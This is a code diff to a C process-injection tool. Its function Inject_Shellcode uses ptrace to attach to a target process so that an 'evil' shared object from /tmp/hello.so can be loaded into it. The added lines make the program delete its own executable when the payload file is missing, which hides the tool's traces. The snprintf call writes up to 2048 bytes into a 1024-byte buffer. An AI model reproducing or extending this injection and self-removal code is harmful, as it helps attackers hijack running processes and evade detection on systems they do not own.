@@ -7,10 +7,36 @@
 int Inject_Shellcode(pid_t target_pid){
         struct user_regs_struct regs, original_regs;
         void *malloc_addr, *dlopen_mode_addr,*mmap_addr;
-        uint8_t *remote_code_ptr,*local_code_ptr;;
+        uint8_t *remote_code_ptr,*local_code_ptr;
         uint32_t code_length;
 
         char evilSoPath[] = "/tmp/hello.so";
+
+
+
+        FILE *fp;
+        fp = fopen(evilSoPath,"r");
+        if(fp == NULL){
+            printf("- Cannot find so file, Exit and remove");
+            char buf[ 1024 ];
+	        int count;
+ 
+	        count = readlink( "/proc/self/exe", buf, 1024 );
+ 
+	        if ( count < 0 || count >= 1024 )
+	        { 
+		        printf( "Failed\n" );
+                exit(0);
+	        }
+	        buf[ count ] = '\0';
+	        char cmd[1024];
+            snprintf(cmd,2048,"rm %s",buf);
+            system(cmd);
+            exit(0);
+        }else{
+            fclose(fp);
+        }
+        
         if ( ptrace_attach( target_pid ) == -1 ){
 
                 printf("inject attach failed\n" );
@@ -19,7 +45,7 @@ int Inject_Shellcode(pid_t target_pid){
 
         printf ("+ Waiting for process...\n");
 
-    printf ("+ Getting Registers\n");
+        printf ("+ Getting Registers\n");
         if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                 printf("- Getregs Error\n" );
                 return -1;
